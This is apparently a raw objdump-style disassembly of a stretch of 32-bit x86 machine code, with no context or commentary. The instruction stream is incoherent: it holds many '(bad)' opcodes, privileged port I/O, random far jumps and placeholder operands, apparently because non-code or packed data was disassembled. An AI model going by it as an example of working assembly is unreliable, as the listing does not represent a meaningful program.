  411fbc:	xchg   DWORD PTR [esi+0x65],ebp
  411fbf:	pop    esi
  411fc0:	js     0x411f7d
  411fc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fc3:	cld    
  411fc4:	add    al,0x3a
  411fc6:	cmp    ah,ah
  411fc8:	pop    edi
  411fc9:	lods   al,BYTE PTR ds:[esi]
  411fca:	ror    BYTE PTR [edx+0x40],0x19
  411fce:	inc    edi
  411fcf:	sub    al,0x5f
  411fd1:	call   0x948e6fda
  411fd6:	jecxz  0x412041
  411fd8:	and    eax,0x2104149b
  411fdd:	sbb    DWORD PTR ds:0x88314dba,esp
  411fe3:	sbb    edx,edi
  411fe5:	push   0x36
  411fe7:	out    0x91,eax
  411fe9:	retf   
  411fea:	adc    eax,0x376958cd
  411fef:	adc    edi,ebx
  411ff1:	cwde   
  411ff2:	add    ch,ah
  411ff4:	xor    BYTE PTR [ecx+0x28],dh
  411ff7:	test   BYTE PTR [esp+ecx*1-0x48],cl
  411ffb:	inc    ebx
  411ffc:	mov    ch,0x46
  411ffe:	arpl   WORD PTR [esi-0x57],ax
  412001:	not    BYTE PTR [edx+edx*8]
  412004:	xchg   ebx,eax
  412005:	inc    esi
  412006:	loopne 0x41206f
  412008:	outs   dx,DWORD PTR ds:[esi]
  412009:	xor    bl,bl
  41200b:	inc    ebp
  41200c:	lahf   
  41200d:	jge    0x412033
  41200f:	push   cs
  412010:	imul   edi,DWORD PTR [ebx+0x24],0xff41b745
  412017:	dec    esp
  412018:	(bad)  
  412019:	jge    0x411fdd
  41201b:	pop    ds
  41201c:	aam    0x28
  41201e:	rcl    ecx,0xd2
  412021:	mov    edi,0x465227df
  412026:	pop    ebx
  412027:	mov    ebx,0x7df3477d
  41202c:	test   eax,0x1df34a3a
  412031:	or     ah,ch
  412033:	inc    esi
  412034:	mov    ah,0xe6
  412036:	stos   BYTE PTR es:[edi],al
  412037:	or     bh,cl
  412039:	jg     0x412009
  41203b:	xchg   esp,eax
  41203c:	call   FWORD PTR [ecx]
  41203e:	dec    edx
  41203f:	retf   0xf7f5
  412042:	pushf  
  412043:	and    al,BYTE PTR [ebx-0x5f]
  412046:	add    dl,bh
  412048:	shl    DWORD PTR [ebp-0x10],cl
  41204b:	call   0x4610:0x699de26c
  412052:	cmp    eax,0x2e9c7a75
  412057:	enter  0x3f2e,0x4e
  41205b:	outs   dx,BYTE PTR ds:[esi]
  41205c:	pusha  
  41205d:	cmp    esp,DWORD PTR [ecx-0x5f]
  412060:	inc    ebx
  412061:	xor    al,0xd1
  412063:	(bad)  
  412064:	mov    ah,0xeb
  412066:	cmp    eax,0x5bb05bf8
  41206b:	int3   
  41206c:	leave  
  41206d:	dec    eax
  41206e:	cmp    edi,DWORD PTR [edi-0x60]
  412071:	mov    ecx,0xa74ef8e5
  412076:	jb     0x412001
  412078:	push   eax
  412079:	cwde   
  41207a:	mov    esi,0xbc693c1f
  41207f:	mov    fs,ebp
  412081:	fst    st(7)
  412083:	push   ebx
  412084:	xor    eax,0x17fae198
  412089:	pusha  
  41208a:	adc    eax,0x95e402dd
  41208f:	mov    al,ds:0x7a7e30cd
  412094:	lock dec eax
  412096:	mov    esp,DWORD PTR [ebx+ecx*2+0x46]
  41209a:	adc    al,0xd9
  41209c:	push   eax
  41209d:	adc    eax,0xf03dd710
  4120a2:	sbb    edx,ebx
  4120a4:	cmp    al,0x6f
  4120a6:	test   al,0xf1
  4120a8:	dec    ecx
  4120a9:	test   DWORD PTR [ecx-0x2096a06c],ecx
  4120af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120b0:	dec    edx
  4120b1:	jecxz  0x41208f
  4120b3:	dec    esi
  4120b4:	jbe    0x412095
  4120b6:	sbb    eax,0x8f5904e0
  4120bb:	clc    
  4120bc:	cmp    al,0xd1
  4120be:	sub    eax,0x932bb996
  4120c3:	enter  0x62b0,0x43
  4120c7:	add    DWORD PTR [ecx+0x659f1ef8],esp
  4120cd:	dec    ebx
  4120ce:	popa   
  4120cf:	shr    esp,cl
  4120d1:	test   eax,0x7d4bcb09
  4120d6:	loope  0x4120d1
  4120d8:	inc    esp
  4120d9:	jl     0x412145
  4120db:	add    ebp,ecx
  4120dd:	and    DWORD PTR [edi-0x3a],edx
  4120e0:	jmp    0x9cc3aa20
  4120e5:	gs iret 
  4120e7:	inc    edi
  4120e8:	jmp    0xa6efbac6
  4120ed:	pop    ecx
  4120ee:	ret    0xb088
  4120f1:	mov    esp,0x556cdb4b
  4120f6:	jno    0x4120ff
  4120f8:	and    BYTE PTR [ecx],ah
  4120fa:	jmp    0x8c8c:0x725402ca
  412101:	shl    BYTE PTR [esi+0x3d9376c1],cl
  412107:	out    0x46,al
  412109:	push   edx
  41210a:	jae    0x41208d
  41210c:	push   ebx
  41210d:	popa   
  41210e:	inc    ebp
  41210f:	xchg   esp,eax
  412110:	and    cl,bl
  412112:	aaa    
  412113:	xchg   edx,eax
  412114:	jmp    0xde9bcf43
  412119:	or     DWORD PTR [ecx-0x71],eax
  41211c:	aam    0xe7
  41211e:	jno    0x412102
  412120:	mov    edi,0x991bdb65
  412125:	or     eax,0x811a07ad
  41212a:	hlt    
  41212b:	mov    esi,0xc784b84d
  412130:	xchg   edi,eax
  412131:	push   cs
  412132:	retf   
  412133:	push   edx
  412134:	xor    ebp,ecx
  412136:	push   ebp
  412137:	fmul   QWORD PTR [edx+0x78]
  41213a:	mov    esi,0x2d24ae31
  41213f:	jo     0x41219c
  412141:	xor    eax,0xa3420339
  412146:	add    al,0x7f
  412148:	jg     0x412118
  41214a:	lock xor al,0x9
  41214d:	sbb    eax,0x6c4b9bd
  412152:	xor    ebx,DWORD PTR [edi]
  412154:	push   0xc98d7518
  412159:	mov    edi,0xc24bcd6d
  41215e:	mov    al,ds:0x5b78431d
  412163:	jle    0x412176
  412165:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412166:	sar    eax,cl
  412168:	leave  
  412169:	fwait
  41216a:	sbb    eax,0x3a5ffbd2
  41216f:	ds xor al,0x13
  412172:	push   ecx
  412173:	pop    ss
  412174:	xor    DWORD PTR [edi+0x4484e34d],0xe15f0d74
  41217e:	xchg   esi,eax
  41217f:	ins    DWORD PTR es:[edi],dx
  412180:	mov    al,ds:0x36d4eaa9
  412185:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412186:	(bad)  
  412187:	test   eax,0xffafd3d5
  41218c:	and    BYTE PTR [ecx],cl
  41218e:	icebp  
  41218f:	and    al,0x31
  412191:	mov    esp,0x7adaf759
  412196:	adc    eax,0x3d605a17
  41219b:	mov    BYTE PTR [ebx-0x7d8b7b3f],bh
  4121a1:	sbb    eax,0xbbab2617
  4121a6:	rol    ebp,cl
  4121a8:	fs or  ebp,0xd07a1eb3
  4121af:	in     al,0x4c
  4121b1:	adc    DWORD PTR [eax+0x4fe400d6],0xda46a11b
  4121bb:	push   esi
  4121bc:	xchg   edi,eax
  4121bd:	mov    dl,0x5f
  4121bf:	add    ah,BYTE PTR [ebx+edi*2-0x5f9a32c2]
  4121c6:	sub    ecx,DWORD PTR [ecx]
  4121c8:	ins    DWORD PTR es:[edi],dx
  4121c9:	add    esp,DWORD PTR [eax+0x43]
  4121cc:	mov    bl,0x70
  4121ce:	in     eax,0x88
  4121d0:	add    ecx,ebp
  4121d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121d3:	dec    esi
  4121d4:	xchg   edx,eax
  4121d5:	(bad)  
  4121d6:	out    0x37,eax
  4121d8:	fcmovb st,st(3)
  4121da:	std    
  4121db:	mov    bh,0x73
  4121dd:	sbb    cl,ch
  4121df:	loop   0x412203
  4121e1:	push   cs
  4121e2:	push   eax
  4121e3:	leave  
  4121e4:	neg    BYTE PTR [edx+eax*1-0x15]
  4121e8:	lods   al,BYTE PTR ds:[esi]
  4121e9:	push   cs
  4121ea:	div    DWORD PTR [ecx+0x7001918]
  4121f0:	rcl    DWORD PTR [si],0xc1
  4121f4:	fnsave ds:0x1afcacc3
  4121fa:	sti    
  4121fb:	xor    eax,ebp
  4121fd:	jmp    0x58599ef8
  412202:	jle    0x4121f9
  412204:	(bad)  
  412205:	arpl   WORD PTR [esp+esi*4-0x49bd8387],si
  41220c:	adc    BYTE PTR [edx-0x2a],ah
  41220f:	cli    
  412210:	jecxz  0x41228a
  412212:	out    0xdc,al
  412214:	popf   
  412215:	or     bh,al
  412217:	jb     0x412200
  412219:	icebp  
  41221a:	retf   0x5fbb
  41221d:	and    DWORD PTR [ebp+0x65b16065],ebx
  412223:	int3   
  412224:	into   
  412225:	in     al,dx
  412226:	js     0x41221c
  412228:	add    bl,BYTE PTR [esi+eax*2-0x6c]
  41222c:	cmp    eax,0x6436e77
  412231:	xchg   ebp,eax
  412232:	push   0x5279cd33
  412237:	mov    eax,0x1c74aa2
  41223c:	div    BYTE PTR [ebx+0x4a]
  41223f:	mov    eax,DWORD PTR [ebp-0x5a7a75a]
  412245:	mov    dl,0x20
  412247:	scas   al,BYTE PTR es:[edi]
  412248:	sti    
  412249:	add    edi,esp
  41224b:	pop    ebp
  41224c:	mov    al,0x95
  41224e:	pop    es
  41224f:	icebp  
  412250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412251:	mov    ecx,0x23db5324
  412256:	lahf   
  412257:	out    0x56,eax
  412259:	mov    ah,0x24
  41225b:	cmp    al,0xd2
  41225d:	fcmovnu st,st(2)
  41225f:	aas    
  412260:	loop   0x412273
  412262:	lock xor DWORD PTR [ebp-0x73],0xffffffed
  412267:	test   BYTE PTR [ebx],cl
  412269:	xor    al,0xe0
  41226b:	test   esp,0x4e814f93
  412271:	out    0xc0,al
  412273:	out    dx,eax
  412274:	lea    edi,[esi-0x1fbbb2a1]
  41227a:	push   edi
  41227b:	mov    dl,0x8c
  41227d:	pop    ds
  41227e:	ja     0x41223e
  412280:	(bad)  
  412281:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412282:	mov    al,0x75
  412284:	mov    esi,0xb787f907
  412289:	clc    
  41228a:	nop
  41228b:	sbb    ecx,esp
  41228d:	adc    esi,DWORD PTR [ecx]
  41228f:	or     al,0x42
  412291:	push   ecx
  412293:	pushf  
  412294:	push   edi
  412295:	repnz (bad) 
  412297:	and    ebp,eax
  412299:	mov    bh,0x63
  41229b:	mov    esp,0xd5c13fd7
  4122a0:	jle    0x412280
  4122a2:	stos   BYTE PTR es:[edi],al
  4122a3:	mov    ebx,0x2e91e30b
  4122a8:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122aa:	test   BYTE PTR [edi+eiz*2],ah
  4122ad:	ret    0xa96a
  4122b0:	pusha  
  4122b1:	xor    BYTE PTR [ebx],cl
  4122b3:	push   0x6d5df2f2
  4122b8:	les    ecx,FWORD PTR [edi+0x47fa288e]
  4122be:	jg     0x41230a
  4122c0:	neg    DWORD PTR [edx-0x7ce35a2d]
  4122c6:	cmc    
  4122c7:	dec    edi
  4122c8:	dec    edi
  4122c9:	imul   ebx,ebx,0xfab1c22c
  4122cf:	(bad)  
  4122d0:	call   DWORD PTR [edx-0x4e]
  4122d3:	enter  0x3bd9,0x64
  4122d7:	fcmovne st,st(0)
  4122d9:	rcr    edi,0xe6
  4122dc:	neg    BYTE PTR [edx+esi*1+0x57b384ca]
  4122e3:	ins    BYTE PTR es:[edi],dx
  4122e4:	xchg   DWORD PTR [eax-0x75],eax
  4122e7:	cdq    
  4122e8:	mov    al,0x7e
  4122ea:	shl    DWORD PTR [ebp+edx*4-0x7517c856],0x6d
  4122f2:	or     al,0x18
  4122f4:	mov    ds:0x73102b39,eax
  4122f9:	push   esi
  4122fa:	jae    0x412342
  4122fc:	mov    ecx,0xa75d52f6
  412301:	xor    al,0x86
  412303:	pop    ebx
  412304:	push   0x44872782
  412309:	mov    al,0x38
  41230b:	push   es
  41230c:	jbe    0x4122da
  41230e:	adc    bl,ch
  412310:	imul   edx,DWORD PTR [eax+0x788c3007],0xffffffe4
  412317:	pop    ebx
  412318:	xor    eax,0x8650dd7f
  41231d:	mov    edi,0xaf93361d
  412322:	jb     0x4122cb
  412324:	cmp    ebp,ebx
  412326:	test   DWORD PTR [ebx],ecx
  412328:	or     DWORD PTR [edx],edx
  41232a:	test   ebx,0x301f0449
  412330:	jb     0x412387
  412332:	hlt    
  412333:	das    
  412334:	loopne 0x41237f
  412336:	push   ecx
  412337:	mov    edi,0x45fb75a5
  41233c:	stos   BYTE PTR es:[edi],al
  41233d:	pop    ecx
  41233e:	shl    BYTE PTR [edi+eiz*8-0x74122d4c],1
  412345:	jb     0x412356
  412347:	mov    dh,0xcb
  412349:	push   esp
  41234a:	xlat   BYTE PTR ds:[ebx]
  41234b:	ds adc eax,0x7909a467
  412351:	fucomp st(5)
  412353:	fstp   QWORD PTR [esi]
  412355:	and    cl,bh
  412357:	mov    esi,0x31fca6d
  41235c:	xor    DWORD PTR [eax+0x426593b5],edx
  412362:	mov    eax,ds:0x8058882a
  412367:	xchg   edi,eax
  412368:	stos   BYTE PTR es:[edi],al
  412369:	or     eax,0xac0ff9c4
  41236e:	dec    ebp
  41236f:	dec    ebp
  412370:	and    al,0x5
  412372:	inc    eax
  412373:	or     DWORD PTR [edi-0x21],ebx
  412376:	das    
  412377:	enter  0x3c88,0x45
  41237b:	xor    al,0xf
  41237d:	aas    
  41237e:	ins    DWORD PTR es:[edi],dx
  41237f:	fstp   TBYTE PTR [ebx]
  412381:	in     al,dx
  412382:	mov    eax,ds:0x5dc10515
  412387:	adc    al,0x5a
  412389:	sbb    ch,BYTE PTR [edi]
  41238b:	pop    ss
  41238c:	xchg   DWORD PTR [edx],ebp
  41238e:	xchg   ebp,eax
  41238f:	sub    ebx,ecx
  412391:	lea    esp,[edx]
  412393:	jns    0x412347
  412395:	outs   dx,DWORD PTR ds:[esi]
  412396:	xchg   ebx,eax
  412397:	pop    eax
  412398:	rcr    bh,0x5f
  41239b:	cmp    ch,dl
  41239d:	xchg   edx,eax
  41239e:	pop    eax
  41239f:	retf   
  4123a0:	mov    DWORD PTR [ebx-0x27],esp
  4123a3:	adc    ecx,DWORD PTR ds:0x1c3eea11
  4123a9:	inc    esi
  4123aa:	mov    bl,0xab
  4123ac:	mov    bl,0xf9
  4123ae:	loopne 0x41233d
  4123b0:	imul   edx,esp,0xffffffa6
  4123b3:	lods   eax,DWORD PTR ds:[esi]
  4123b4:	mov    eax,ds:0xc4215381
  4123b9:	mov    dl,dh
  4123bb:	lock xor eax,0x617049cd
  4123c1:	js     0x4123b5
  4123c3:	adc    eax,0x85ac81e4
  4123c8:	cmp    eax,0xa3f40a38
  4123cd:	aam    0x2d
  4123cf:	jno    0x41244f
  4123d1:	xor    al,0xd8
  4123d3:	pop    edi
  4123d4:	lods   al,BYTE PTR ds:[esi]
  4123d5:	imul   ebx,DWORD PTR [esi+0x50],0x59
  4123d9:	rol    BYTE PTR [esi+edi*8-0x68],cl
  4123dd:	shl    BYTE PTR [eax+0x37],0x24
  4123e1:	cmp    DWORD PTR ds:0xba75acad,esp
  4123e7:	mov    edx,ds
  4123e9:	sbb    esi,DWORD PTR [eax]
  4123eb:	mov    ebp,0xd48625c9
  4123f0:	in     eax,0x8e
  4123f2:	hlt    
  4123f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123f4:	or     ah,bl
  4123f6:	cdq    
  4123f7:	mov    ah,0x78
  4123f9:	mov    bl,0x2d
  4123fb:	fmul   st(5),st
  4123fd:	mov    ds:0x91c64521,eax
  412402:	loopne 0x412389
  412404:	adc    eax,0x877abadc
  412409:	mov    eax,ds:0x1431eba8
  41240e:	push   ecx
  41240f:	dec    ecx
  412410:	retf   0x7175
  412413:	add    ch,BYTE PTR [esi+0x786113aa]
  412419:	fiadd  DWORD PTR fs:[ecx+0x7bfe3b71]
  412420:	or     bh,cl
  412422:	jle    0x412476
  412424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412425:	dec    esi
  412426:	mov    edx,0x8c9d0cea
  41242b:	or     al,0xea
  41242d:	inc    esp
  41242e:	int3   
  41242f:	iret   
  412430:	mov    bl,0x3
  412432:	sbb    edi,esp
  412434:	xor    eax,0xaaf3f13
  412439:	mov    dl,0xe7
  41243b:	int3   
  41243c:	nop
  41243d:	sbb    al,BYTE PTR [esi-0x3f853e1a]
  412443:	xchg   ebp,eax
  412444:	add    eax,0xb133efe4
  412449:	dec    ebx
  41244a:	xlat   BYTE PTR ds:[ebx]
  41244b:	cld    
  41244c:	jp     0x412451
  41244e:	adc    al,0x5e
  412450:	loopne 0x41249c
  412452:	icebp  
  412453:	icebp  
  412454:	pop    ebp
  412455:	push   es
  412456:	js     0x412472
  412458:	inc    ebp
  412459:	sbb    esi,DWORD PTR [edi-0x4490778b]
  41245f:	pop    ecx
  412460:	push   0x968a94d2
  412465:	push   esp
  412466:	sbb    BYTE PTR [esi],al
  412468:	dec    edx
  412469:	out    dx,eax
  41246a:	data16 lods al,BYTE PTR ds:[esi]
  41246c:	fld    QWORD PTR [edx]
  41246e:	push   esi
  41246f:	pop    eax
  412470:	add    al,0xd9
  412472:	lahf   
  412473:	fsubp  st(0),st
  412475:	stos   DWORD PTR es:[edi],eax
  412476:	jnp    0x4124f0
  412478:	popa   
  412479:	mov    ebx,0xc05f92cf
  41247e:	xchg   edi,eax
  41247f:	aas    
  412480:	fdiv   DWORD PTR [esi]
  412482:	cmp    ecx,eax
  412484:	mov    eax,0xc8e1cf9a
  412489:	scas   al,BYTE PTR es:[edi]
  41248a:	(bad)  [edi]
  41248c:	xor    al,0xa8
  41248e:	or     dh,BYTE PTR [edi+0x23291c66]
  412494:	push   cs
  412495:	push   es
  412496:	mov    ch,0x55
  412498:	mov    bh,0x47
  41249a:	sbb    eax,0xb9b85123
  41249f:	and    bh,0xf7
  4124a2:	push   edi
  4124a3:	sub    DWORD PTR [ecx],ebx
  4124a5:	ds add al,0x88
  4124a8:	das    
  4124a9:	loop   0x412500
  4124ab:	lds    ebp,FWORD PTR ds:[edx]
  4124ae:	inc    esp
  4124af:	pop    esi
  4124b0:	scas   al,BYTE PTR es:[edi]
  4124b1:	mov    ds:0x69cab1c6,al
  4124b6:	lock sbb DWORD PTR [edi+0x0],esi
  4124ba:	stos   DWORD PTR es:[edi],eax
  4124bb:	push   ss
  4124bc:	pop    DWORD PTR [edi+0x4cdc2685]
  4124c2:	loop   0x41253a
  4124c4:	adc    al,0xf2
  4124c6:	mov    bh,ah
  4124c8:	push   ebp
  4124c9:	call   0xda2be69f
  4124ce:	pop    ds
  4124cf:	and    dl,0x86
  4124d2:	xor    esi,ebp
  4124d4:	xor    eax,0x4e33e5c1
  4124d9:	sub    DWORD PTR [esi],esi
  4124db:	ja     0x4124a0
  4124dd:	lahf   
  4124de:	jmp    0x577b:0xe77eff75
  4124e5:	lea    esi,[esi+0x4e332aca]
  4124eb:	jl     0x412499
  4124ed:	test   eax,ebx
  4124ef:	in     eax,0xd7
  4124f1:	loopne 0x412512
  4124f3:	pop    ds
  4124f4:	shr    DWORD PTR [esi+0x50089258],cl
  4124fa:	leave  
  4124fb:	stc    
  4124fc:	cdq    
  4124fd:	ss cmp esp,eax
  412500:	mov    DWORD PTR [ebx+0x5],edi
  412503:	fbld   TBYTE PTR [ecx+0x72]
  412506:	out    0x7e,al
  412508:	leave  
  412509:	test   eax,0xed6c1562
  41250e:	iret   
  41250f:	cli    
  412510:	in     eax,dx
  412511:	mov    ah,0xcf
  412513:	xchg   esp,eax
  412514:	fwait
  412515:	(bad)  
  412516:	lods   al,BYTE PTR ds:[esi]
  412517:	idiv   BYTE PTR [esi-0x1106e9bc]
  41251d:	sbb    ebp,DWORD PTR [ebx-0x33d31597]
  412523:	mov    ds:0x9b00c3ab,eax
  412528:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412529:	push   ecx
  41252a:	sbb    bl,0xc8
  41252d:	mov    ah,0xde
  41252f:	mov    ds:0x9b9e7329,eax
  412534:	mov    ch,al
  412536:	or     dh,bl
  412538:	sub    BYTE PTR [eax*8+0x50dd1e39],bl
  41253f:	mov    bl,0x1d
  412541:	sahf   
  412542:	jno    0x4124ee
  412544:	or     DWORD PTR [ecx+0x39],ebp
  412547:	int3   
  412548:	pop    ss
  412549:	jne    0x41252a
  41254b:	mov    ch,0x3d
  41254d:	in     eax,dx
  41254e:	sub    DWORD PTR [esi-0x46cadd4e],0xffffffca
  412555:	enter  0x1b84,0x71
  412559:	dec    ecx
  41255a:	jb     0x412545
  41255c:	fst    DWORD PTR [ecx-0x1fa147cb]
  412562:	mov    ah,0x91
  412564:	inc    edx
  412565:	push   ss
  412566:	leave  
  412567:	es push es
  412569:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41256a:	ret    0x8475
  41256d:	pop    esp
  41256e:	fldcw  WORD PTR [ebp+0x31]
  412571:	imul   ebx,DWORD PTR [eax-0x376b896b],0xffffffdb
  412578:	lds    ebx,FWORD PTR [ebx+0x70]
  41257b:	aad    0xb
  41257d:	jmp    0xd713:0x9b8fc1cf
  412584:	mov    cl,0x81
  412586:	xor    DWORD PTR [edx+0x31],edi
  412589:	daa    
  41258a:	popf   
  41258b:	sub    eax,DWORD PTR [ebp-0x11]
  41258e:	loopne 0x412537
  412590:	jns    0x4125fa
  412592:	ds fcomi st,st(4)
  412595:	addr16 aad 0x7
  412598:	pusha  
  412599:	test   eax,0xe28a196a
  41259e:	fstp   TBYTE PTR [ecx-0x5c]
  4125a1:	pop    ebx
  4125a2:	push   ss
  4125a3:	xor    DWORD PTR [ebp+ebp*2-0x80],ecx
  4125a7:	pop    edi
  4125a8:	dec    esp
  4125a9:	mov    fs,WORD PTR [ebx]
  4125ab:	mov    DWORD PTR [edi+0xe],edi
  4125ae:	cwde   
  4125af:	push   0x959c39f3
  4125b4:	pushf  
  4125b5:	jae    0x4125fc
  4125b7:	mov    ch,dh
  4125b9:	xchg   esp,eax
  4125ba:	lock pop edi
  4125bc:	jbe    0x4125e8
  4125be:	and    BYTE PTR [esi],dl
  4125c0:	ins    BYTE PTR es:[edi],dx
  4125c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125c2:	cwde   
  4125c3:	dec    ecx
  4125c4:	xchg   ebx,eax
  4125c5:	mov    ds:0x9ef148e5,eax
  4125ca:	xor    eax,0x865d985e
  4125cf:	push   esp
  4125d0:	pop    ebp
  4125d1:	in     al,dx
  4125d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125d3:	out    0x77,al
  4125d5:	mov    edx,DWORD PTR [edx+0x5a]
  4125d8:	test   DWORD PTR [esp+edi*2-0x6a],0xd4a9f1a6
  4125e0:	push   edx
  4125e1:	imul   ebx,DWORD PTR [edx+0x62],0x2a
  4125e5:	pop    ecx
  4125e6:	pusha  
  4125e7:	sbb    BYTE PTR [edi+0x2d],bl
  4125ea:	(bad)  
  4125eb:	call   0xc2ae:0x5488ee0f
  4125f2:	adc    ebx,DWORD PTR [eax]
  4125f4:	mov    ds:0xb599ed9e,al
  4125f9:	mov    dh,dh
  4125fb:	dec    edx
  4125fc:	fistp  DWORD PTR [ebx-0x81c38e6]
  412602:	div    BYTE PTR [esi]
  412604:	fnstenv [ebx+0x32168542]
  41260a:	dec    esi
  41260b:	or     cl,0x9a
  41260e:	cld    
  41260f:	mov    ah,0x91
  412611:	mov    edx,0x1b4ee93d
  412616:	(bad)  
  412618:	scas   al,BYTE PTR es:[edi]
  412619:	and    DWORD PTR [eax],ebp
  41261b:	sub    al,0x56
  41261d:	sub    BYTE PTR [edx],dh
  41261f:	pop    esi
  412620:	and    edx,0xebe6f3c6
  412626:	xor    ah,BYTE PTR [ebp+0x28]
  412629:	imul   edx,DWORD PTR [esi-0x632b7d0d],0xffffffd8
  412630:	dec    ebp
  412631:	pop    es
  412632:	add    dl,BYTE PTR [ebp+0x6e819d22]
  412638:	stc    
  412639:	rol    ebp,1
  41263b:	popa   
  41263c:	lods   eax,DWORD PTR ds:[esi]
  41263d:	jns    0x4126b1
  41263f:	popa   
  412640:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412641:	aad    0x8
  412643:	inc    edx
  412644:	mov    edx,0x3aceb170
  412649:	sub    al,0x89
  41264b:	loopne 0x41264b
  41264d:	sub    ebx,DWORD PTR [ebp+0x2d]
  412650:	es mov eax,0xbc6c46f6
  412656:	mov    BYTE PTR [eax-0x44e24a9b],bl
  41265c:	xor    DWORD PTR [ebx],0xffffff9b
  41265f:	mov    dh,0x51
  412661:	sar    DWORD PTR [ecx-0x36],cl
  412664:	and    eax,DWORD PTR [esi+ecx*1-0x17b7c49c]
  41266b:	push   ss
  41266c:	jle    0x4126e8
  41266e:	std    
  41266f:	cmp    dl,BYTE PTR [esi-0x24]
  412672:	or     eax,0x1cc20211
  412677:	dec    ebp
  412678:	in     eax,dx
  412679:	xchg   esi,eax
  41267a:	div    dl
  41267c:	mov    esp,?
  41267e:	popa   
  41267f:	pop    ecx
  412680:	ret    
  412681:	pop    ecx
  412682:	jmp    0x5f06:0x6cdf65a1
  412689:	icebp  
  41268a:	xchg   DWORD PTR [ebx+0x2a],ebx
  41268d:	mov    cl,BYTE PTR [edx-0x59]
  412690:	jne    0x412651
  412692:	out    dx,eax
  412693:	pop    edi
  412694:	xchg   ebp,eax
  412695:	loopne 0x412709
  412697:	inc    ebp
  412698:	inc    edx
  412699:	test   BYTE PTR [edx-0x2d924563],0xe8
  4126a0:	int3   
  4126a1:	or     BYTE PTR [ebx+ebx*8-0x1c],dl
  4126a5:	cmp    BYTE PTR [edi+0x25],ch
  4126a8:	std    
  4126a9:	mov    edi,0xd5d377d3
  4126ae:	scas   al,BYTE PTR es:[edi]
  4126af:	inc    ecx
  4126b0:	xchg   ebp,eax
  4126b1:	es mov al,0x2f
  4126b4:	test   eax,0x9d371a89
  4126b9:	mov    eax,0xf5ed0e88
  4126be:	xlat   BYTE PTR ds:[ebx]
  4126bf:	out    0xb,al
  4126c1:	mov    ?,WORD PTR [ebx+0x42]
  4126c4:	cld    
  4126c5:	or     ebp,DWORD PTR [esi+0x42787878]
  4126cb:	popa   
  4126cc:	adc    edx,DWORD PTR [edx+0x35cbbf36]
  4126d2:	in     al,dx
  4126d3:	dec    esp
  4126d4:	push   ss
  4126d5:	cld    
  4126d6:	out    0x35,eax
  4126d8:	pop    ss
  4126d9:	sub    BYTE PTR [eax-0x57],0x84
  4126dd:	enter  0x786d,0x92
  4126e1:	leave  
  4126e2:	mov    BYTE PTR [ebp-0xd],cl
  4126e5:	inc    ecx
  4126e6:	shl    DWORD PTR [esi+0x4571a831],cl
  4126ec:	mov    eax,0xec992569
  4126f1:	cmp    BYTE PTR [edi],ah
  4126f3:	(bad)  [edx]
  4126f5:	mov    bl,0xa1
  4126f7:	add    BYTE PTR [eax+ebx*4],ah
  4126fa:	lock push ds
  4126fc:	out    0x61,eax
  4126fe:	sbb    BYTE PTR [ecx],ch
  412700:	call   0x9af4:0x8c932d3b
  412707:	in     al,dx
  412708:	fwait
  412709:	cwde   
  41270a:	or     eax,0x48bb47ea
  41270f:	pop    es
  412710:	ins    DWORD PTR es:[edi],dx
  412711:	mov    ecx,0xe492dcd5
  412716:	inc    edx
  412717:	push   edx
  412718:	popa   
  412719:	ds enter 0x4133,0xa8
  41271e:	pop    ds
  41271f:	js     0x412785
  412721:	in     al,0x5e
  412723:	pop    eax
  412724:	or     al,0xa0
  412726:	cli    
  412727:	push   eax
  412728:	aam    0x5c
  41272a:	das    
  41272b:	addr16 push es
  41272d:	xor    DWORD PTR [edx],edx
  41272f:	in     al,0xf6
  412731:	adc    esp,DWORD PTR [esp+eiz*4+0x1c]
  412735:	stc    
  412736:	add    al,0x1a
  412738:	addr16 xchg esi,eax
  41273a:	stc    
  41273b:	mov    bl,0x92
  41273d:	enter  0xc65a,0x2b
  412741:	mov    ds:0x646d5b78,al
  412746:	xchg   ecx,eax
  412747:	pop    esp
  412748:	cmp    bl,BYTE PTR [ebx-0x47]
  41274b:	(bad)  
  41274c:	das    
  41274d:	jecxz  0x41277b
  41274f:	jl     0x41276b
  412751:	and    esi,DWORD PTR [ecx]
  412753:	aas    
  412754:	data16 mov cl,0x89
  412757:	mov    dh,0xe0
  412759:	dec    edi
  41275a:	and    eax,0xbba81106
  41275f:	jg     0x4127a1
  412761:	mov    cl,BYTE PTR [eax+0x6f]
  412764:	pop    ss
  412765:	(bad)  
  412767:	test   DWORD PTR [eax],eax
  412769:	cdq    
  41276a:	sub    DWORD PTR [ebp-0x311b380],eax
  412770:	pop    edx
  412771:	xchg   BYTE PTR [edi+edx*2],bl
  412774:	mov    al,ds:0xd1bb214
  412779:	fsubr  QWORD PTR [edi-0x5e]
  41277c:	dec    edx
  41277d:	clc    
  41277e:	out    0x6f,al
  412780:	rcr    ebp,1
  412782:	jmp    0xba379617
  412787:	stos   BYTE PTR es:[edi],al
  412788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412789:	mov    dl,0x97
  41278b:	in     al,0x28
  41278d:	ficomp WORD PTR [edi-0x172b35b9]
  412793:	mov    esi,0x53d872e2
  412798:	pushf  
  412799:	mov    ds:0xb403cf11,al
  41279e:	rol    DWORD PTR [ebx-0x36771e83],cl
  4127a4:	jmp    0x4127b0
  4127a6:	repz mov ebx,0x2224fb11
  4127ac:	mov    eax,ds:0x6c62a5b8
  4127b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127b2:	out    dx,al
  4127b3:	mov    edx,0x9e7b6f8a
  4127b8:	imul   eax,DWORD PTR [edx+ecx*1],0x3a
  4127bc:	cmc    
  4127bd:	mov    gs,esi
